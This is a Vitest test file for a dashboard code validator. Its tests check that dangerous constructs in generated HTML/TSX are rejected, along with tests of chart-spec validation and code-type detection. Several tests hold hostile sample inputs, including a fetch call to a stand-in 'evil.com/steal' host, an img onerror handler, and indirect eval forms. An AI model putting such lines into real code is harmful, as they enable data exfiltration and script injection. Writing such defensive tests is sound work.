import { describe, it, expect } from "vitest";
import {
  validateDashboardCode,
  validateChartSpecs,
  detectCodeType,
} from "@/lib/dashboard/code-validator";

describe("validateDashboardCode", () => {
  it("rejects executable TSX with default export", () => {
    const code = `
export default function Dashboard() {
  return <div>Hello</div>;
}`;
    const result = validateDashboardCode(code);
    expect(result.valid).toBe(false);
  });

  it("accepts valid HTML", () => {
    const code = `<div class="p-4"><h1>Dashboard</h1></div>`;
    const result = validateDashboardCode(code);
    expect(result.valid).toBe(true);
  });

  it("rejects empty code", () => {
    const result = validateDashboardCode("");
    expect(result.valid).toBe(false);
    expect(result.errors).toContain("Empty code");
  });

  it("blocks eval()", () => {
    const code = `export default function Dashboard() { eval("alert(1)"); return <div />; }`;
    const result = validateDashboardCode(code);
    expect(result.valid).toBe(false);
    expect(result.errors.some((e) => e.includes("eval"))).toBe(true);
  });

  it("blocks new Function()", () => {
    const code = `export default function Dashboard() { new Function("return 1"); return <div />; }`;
    const result = validateDashboardCode(code);
    expect(result.valid).toBe(false);
  });

  it("blocks localStorage access", () => {
    const code = `export default function Dashboard() { localStorage.setItem("x","y"); return <div />; }`;
    const result = validateDashboardCode(code);
    expect(result.valid).toBe(false);
  });

  it("blocks document.cookie access", () => {
    const code = `export default function Dashboard() { const c = document.cookie; return <div />; }`;
    const result = validateDashboardCode(code);
    expect(result.valid).toBe(false);
  });

  it("blocks dangerouslySetInnerHTML", () => {
    const code = `export default function Dashboard() { return <div dangerouslySetInnerHTML={{__html: "x"}} />; }`;
    const result = validateDashboardCode(code);
    expect(result.valid).toBe(false);
  });

  it("blocks external fetch URLs", () => {
    const code = `export default function Dashboard() { fetch("https://evil.com/steal"); return <div />; }`;
    const result = validateDashboardCode(code);
    expect(result.valid).toBe(false);
  });

  it("blocks local fetch", () => {
    const code = `export default function Dashboard() { fetch("/api/health"); return <div />; }`;
    const result = validateDashboardCode(code);
    expect(result.valid).toBe(false);
  });

  it("strips markdown fences", () => {
    const code = "```tsx\nexport default function Dashboard() { return <div />; }\n```";
    const result = validateDashboardCode(code);
    expect(result.code).not.toContain("```");
    expect(result.code).toContain("export default");
  });

  it("rejects non-HTML executable source", () => {
    const code = `function Dashboard() { return <div />; }`;
    const result = validateDashboardCode(code);
    expect(result.valid).toBe(false);
  });

  it("blocks case-insensitive eval variants", () => {
    expect(validateDashboardCode('EVAL("code")').valid).toBe(false);
    expect(validateDashboardCode('eVaL("code")').valid).toBe(false);
  });

  it("blocks indirect eval: (0, eval)(code)", () => {
    const code = '(0, eval)("alert(1)")';
    expect(validateDashboardCode(code).valid).toBe(false);
  });

  it("blocks window bracket access: window['eval']", () => {
    const code = 'window["eval"]("code")';
    expect(validateDashboardCode(code).valid).toBe(false);
  });

  it("blocks setTimeout with string argument", () => {
    const code = 'setTimeout("alert(1)", 100)';
    expect(validateDashboardCode(code).valid).toBe(false);
  });

  it("blocks setInterval with string argument", () => {
    const code = "setInterval('doEvil()', 1000)";
    expect(validateDashboardCode(code).valid).toBe(false);
  });

  it("blocks inline event handlers", () => {
    const code = '<img onerror="alert(1)" src="x">';
    expect(validateDashboardCode(code).valid).toBe(false);
  });

  it("blocks XMLHttpRequest", () => {
    const code = "var x = new XMLHttpRequest()";
    expect(validateDashboardCode(code).valid).toBe(false);
  });

  it("blocks setTimeout with function argument", () => {
    const code = "setTimeout(function() { reportHeight(); }, 500)";
    expect(validateDashboardCode(code).valid).toBe(false);
  });

  it("rejects data-chart capabilities without an executable chart runtime", () => {
    const code = `<div data-chart='{"type":"bar","labels":["A"],"datasets":[{"data":[1]}]}'></div>`;
    expect(validateDashboardCode(code).valid).toBe(false);
  });

  it("rejects invalid JSON in data-chart", () => {
    const code = `<div data-chart='not json'></div>`;
    const result = validateDashboardCode(code);
    expect(result.valid).toBe(false);
    expect(result.errors.some((e) => e.includes("Invalid JSON"))).toBe(true);
  });

  it("rejects unknown chart type in data-chart", () => {
    const code = `<div data-chart='{"type":"scatter","datasets":[]}'></div>`;
    const result = validateDashboardCode(code);
    expect(result.valid).toBe(false);
    expect(result.errors.some((e) => e.includes("Invalid chart type"))).toBe(true);
  });
});

describe("validateChartSpecs", () => {
  it("returns empty array for valid specs", () => {
    const code = `<div data-chart='{"type":"line","labels":["A","B"],"datasets":[{"data":[1,2]}]}'></div>`;
    expect(validateChartSpecs(code)).toHaveLength(0);
  });

  it("catches invalid JSON", () => {
    const errors = validateChartSpecs(`<div data-chart='{broken}'></div>`);
    expect(errors).toHaveLength(1);
    expect(errors[0]).toContain("Invalid JSON");
  });

  it("catches invalid chart type", () => {
    const errors = validateChartSpecs(`<div data-chart='{"type":"funnel"}'></div>`);
    expect(errors).toHaveLength(1);
    expect(errors[0]).toContain("Invalid chart type");
  });

  it("catches non-array datasets", () => {
    const errors = validateChartSpecs(`<div data-chart='{"type":"bar","datasets":"wrong"}'></div>`);
    expect(errors).toHaveLength(1);
    expect(errors[0]).toContain("datasets must be an array");
  });

  it("allows all valid chart types", () => {
    for (const type of ["bar", "line", "doughnut", "pie", "radar", "polarArea"]) {
      expect(validateChartSpecs(`<div data-chart='{"type":"${type}"}'></div>`)).toHaveLength(0);
    }
  });
});

describe("detectCodeType", () => {
  it("detects TSX from export default", () => {
    expect(detectCodeType("export default function Dashboard() {}")).toBe("tsx");
  });

  it("detects TSX from import", () => {
    expect(detectCodeType('import React from "react";')).toBe("tsx");
  });

  it("detects TSX from useState", () => {
    expect(detectCodeType("const [x, setX] = useState(0)")).toBe("tsx");
  });

  it("detects HTML without React keywords", () => {
    expect(detectCodeType('<div class="p-4">Hello</div>')).toBe("html");
  });
});
